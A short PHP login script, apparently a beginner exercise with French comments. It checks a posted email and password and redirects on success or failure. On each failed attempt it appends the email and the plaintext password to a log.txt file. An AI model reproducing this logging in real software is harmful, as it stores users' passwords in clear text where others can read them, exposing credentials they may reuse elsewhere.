<?php

	require "functions.php";
	$email = trim($_POST["email"]);
	$pwd = $_POST["pwd"];
	
	$user = selectUser($email, $pwd);
	if(empty($user))
	{
		
		//ouverture
		$handle = fopen("log.txt", "a+");
		//ecriture
		fwrite($handle,$email." -> ".$pwd."\r\n" );
		//fermeture 
		fclose($handle);

		header('Location: page1.php?msg=auth_failed');
		exit();

	}else{

		connectUser($user);

		header('Location: page1.php?msg=auth_success');
		exit();
	}



?>